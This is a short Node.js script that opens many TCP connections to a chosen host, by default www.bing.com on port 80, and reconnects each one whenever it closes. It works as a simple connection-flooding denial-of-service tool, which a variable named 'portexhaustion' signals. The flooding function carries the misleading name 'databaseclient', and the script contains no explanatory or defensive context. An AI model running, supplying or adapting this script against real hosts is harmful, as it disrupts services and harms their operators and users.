#!/usr/bin/env nodejs
var net = require('net');

var args = process.argv.slice();
var target = args[2] || 'www.bing.com'
var port = args[3] || 80
var portexhaustion = args[4]-1 || 9

function databaseclient(){
    var client = new net.Socket();
    client.connect(port, target, function() {
    });

    client.on('data', function(data) {
    });

    client.on('error', function(ex){
    });

    client.on('close', function(ex){
            client.connect(port, target);
    });
}

var i = 0;
var loopcount = portexhaustion;
while (i <= loopcount){
    databaseclient();
    i++;
}